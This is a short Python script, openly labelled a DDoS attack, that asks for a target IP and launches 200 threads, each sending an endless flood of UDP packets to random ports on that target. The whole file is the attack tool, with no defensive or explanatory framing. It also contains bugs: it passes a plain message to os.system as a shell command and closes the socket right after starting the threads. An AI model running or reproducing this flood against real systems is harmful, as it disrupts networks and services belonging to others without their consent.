import sys
import os
import time
import socket
import random
import threading

""" Create a datagram based server socket that uses IPv4 addressing scheme """
datagramSocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM);


targetIP = raw_input("Enter IP address of Target: ");


os.system("clear");
os.system("DDOS Attack is Starting");

packetIP = 0;
threadLimit = 200;

def DDos_Attack():
	while True:
		targetPort = random.randint(1, 65535);
		datagramSocket.sendto(("Hello World!\n").encode('ascii'), (targetIP, targetPort));

		global packetIP;
		packetIP = packetIP + 1;
		print("Packet ", packetIP, " was sent throught port %s", targetPort);

for i in range(0, threadLimit):
	thread_load = threading.Thread(target = DDos_Attack);
	thread_load.start();

datagramSocket.close();
